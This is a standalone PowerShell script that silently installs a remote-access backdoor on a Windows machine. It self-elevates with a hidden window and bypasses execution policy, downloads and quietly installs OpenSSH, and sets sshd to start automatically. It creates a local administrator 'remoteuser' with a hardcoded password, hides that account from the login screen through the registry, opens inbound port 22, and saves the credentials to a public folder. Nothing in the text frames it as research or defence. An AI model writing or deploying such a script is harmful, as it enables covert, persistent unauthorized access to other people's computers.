# Self-elevate hidden
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
    Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs -WindowStyle Hidden
    exit
}

# Download and install OpenSSH
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$url = "https://github.com/PowerShell/Win32-OpenSSH/releases/download/v9.5.0.0p1-Beta/OpenSSH-Win64-v9.5.0.0.msi"
$msiPath = "$env:TEMP\OpenSSH.msi"
Invoke-WebRequest -Uri $url -OutFile $msiPath
Start-Process msiexec.exe -ArgumentList "/i `"$msiPath`" /qn" -Wait
Start-Sleep -Seconds 5

# Start SSH
try {
    Start-Service sshd
    Set-Service -Name sshd -StartupType 'Automatic'
} catch {}

# Create user with hardcoded password
$username = "remoteuser"
$password = "up8sWt2KB"
net user $username $password /add
net localgroup Administrators $username /add

# Hide user from login screen
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
New-Item -Path $regPath -Force | Out-Null
New-ItemProperty -Path $regPath -Name $username -Value 0 -PropertyType DWORD -Force | Out-Null

# Firewall rule
New-NetFirewallRule -Name "OpenSSH" -DisplayName "OpenSSH SSH Server" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow -ErrorAction SilentlyContinue

# Save creds
$creds = "Username: $username`nPassword: $password"
Set-Content -Path "C:\Users\Public\ssh_creds.txt" -Value $creds
